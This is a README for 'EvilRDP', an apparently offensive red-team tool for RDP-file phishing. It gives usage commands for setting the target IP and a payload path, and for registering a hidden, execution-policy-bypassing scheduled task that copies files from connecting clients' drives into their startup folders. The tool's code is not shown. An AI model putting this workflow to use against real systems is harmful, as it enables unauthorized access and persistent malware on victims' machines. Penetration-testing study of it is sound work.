# EvilRDP - A Red Team Tool for Initial Access

![Python Version](https://img.shields.io/badge/python-3.6+-blue.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)
![Platform](https://img.shields.io/badge/platform-Windows-lightgrey.svg)

![Cover Image](assets/EvilRDP.png)

A Python-based educational toolkit for gaining access to Windows via RDP files. Designed for security research and penetration testing in authorized lab environments.

## Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY**

This tool is intended solely for:
- Security research and education
- Authorized penetration testing
- Controlled lab environments
- Understanding RDP security mechanisms

Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.

## Features

- **RDP File Modification** - Automatically update IP addresses in .rdp files
- **PowerShell Script Editing** - Modify file paths in PowerShell scripts
- **Scheduled Task Creation** - Generate XML for tasks that trigger on RDP connections
- **Colorized Output** - Beautiful, easy-to-read terminal output
- **Automatic Backups** - Creates backup files before modifications
- **Retry Logic** - Handles file permission issues gracefully
- **User Context** - Run tasks as specific users with custom privileges

## Prerequisites

- Python 3.6 or higher
- Windows operating system (for task execution)
- Administrator privileges (for task creation)

## Installation

```bash
# Clone the repository
git clone https://github.com/AibelKingslayer/EvilRDP.git
cd EvilRDP

# Install dependencies
pip install -r requirements.txt
```

## Usage

### Basic Examples

#### Modify RDP File
```bash
python EvilRDP.py --rdp-file config.rdp --ip 192.168.1.100
```

#### Modify PowerShell Script
```bash
python EvilRDP.py --ps1-file script.ps1 --file-path "C:\Tools\payload.exe"
```

#### Create Scheduled Task (Current User)
```bash
python EvilRDP.py --create-task EvilRDP.xml --task-ps1-path "C:\Scripts\script.ps1"
```

#### Create Scheduled Task (Specific User)
```bash
python EvilRDP.py --create-task EvilRDP.xml --task-ps1-path "C:\Scripts\script.ps1" --username "admin"
```

#### Complete Workflow
```bash
python EvilRDP.py \
    --rdp-file config.rdp --ip 10.0.0.50 \
    --ps1-file script.ps1 --file-path "C:\Tools\payload.exe" \
    --create-task EvilRDP.xml --task-ps1-path "C:\Scripts\script.ps1" \
    --username "admin"
```

#### Create Sample Files
```bash
python EvilRDP.py --create-samples ./test_files
```

## Command-Line Options

| Option | Description |
|--------|-------------|
| `--rdp-file` | Path to the .rdp file to modify |
| `--ip` | New IP address for RDP connection |
| `--ps1-file` | Path to the PowerShell script to modify |
| `--file-path` | New file path to use in PowerShell script |
| `--create-task` | Create scheduled task XML file |
| `--task-ps1-path` | Full path to PowerShell script for scheduled task |
| `--username` | Username to run scheduled task as (defaults to current user) |
| `--create-samples` | Create sample RDP and PS1 files in specified directory |

## Scheduled Task Import

After creating the XML file, import it using:

```powershell
# Run as Administrator
schtasks /create /tn "EvilRDP" /xml "EvilRDP.xml" /f
```

Or using PowerShell:

```powershell
# Run as Administrator
$xml = Get-Content "EvilRDP.xml" -Raw
Register-ScheduledTask -TaskName "EvilRDP" -Xml $xml -Force
```

## Verification

Check if the task was created successfully:

```powershell
# View task details
schtasks /query /tn "EvilRDP" /fo LIST /v

# Or open Task Scheduler GUI
taskschd.msc
```

## Features Deep Dive

### Scheduled Task Configuration

The generated scheduled task includes:

- **Trigger**: `SessionStateChangeTrigger` - RemoteConnect
- **User Context**: Runs as specified user with standard privileges
- **Logon Type**: InteractiveToken (only when user is logged on)
- **Execution Policy**: Bypass with hidden window
- **Multiple Instances**: IgnoreNew (prevents duplicate executions)

### PowerShell Script Template

The default PowerShell script:
- Accesses RDP client drives via `\\tsclient\C\`
- Targets user startup folders
- Copies specified files to startup directories
- Handles errors silently

### RDP File Configuration

Modifies the following in .rdp files:
- `full address:s:` - Target IP address
- Supports both UTF-16-LE and UTF-8 encodings
- Preserves all other RDP settings

## Troubleshooting

### Permission Denied Error
- Close any programs using the files (Remote Desktop Connection, PowerShell ISE, etc.)
- Run the script as Administrator
- Copy files to a non-protected directory

### Task Creation Failed
- Ensure you're running PowerShell as Administrator
- Check that the XML file is properly formatted
- Verify the paths in the XML are correct

### Task Not Triggering
- Verify the task is enabled in Task Scheduler
- Check that the user specified matches the RDP login user
- Ensure PowerShell execution policy allows scripts

## Project Structure

```
EvilRDP/
├── EvilRDP.py                 # Main script
├── requirements.txt           # Python dependencies
├── README.md                  # This file
└── examples/
    ├── sample.rdp            # Sample RDP file
    ├── sample.ps1            # Sample PowerShell script
    └── EvilRDP_Task.xml      # Sample scheduled task XML
```

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Acknowledgments

- Inspired by Gemini Cyber Security's Youtube Video - [Cyber Security - Initial Access via .RDP Phishing Attack on Windows](https://youtu.be/Z6oal5CsF_U?si=BNTcTeZne1JyZa2l)
- Built for educational purposes in the information security community
- Thanks to all contributors and security researchers

## Educational Resources

- [Understanding RDP Security](https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/clients/rdp-files)
- [Windows Task Scheduler](https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page)
- [PowerShell Security Best Practices](https://docs.microsoft.com/en-us/powershell/scripting/learn/security/securing-powershell)

## Legal Notice

The authors and contributors of this tool are not responsible for any misuse or damage caused by this program. This tool is provided "as-is" without any warranties. Use at your own risk and only on systems you own or have explicit permission to test.

---

**Remember: Always obtain proper authorization before testing security tools on any system.**

*Made for the InfoSec community*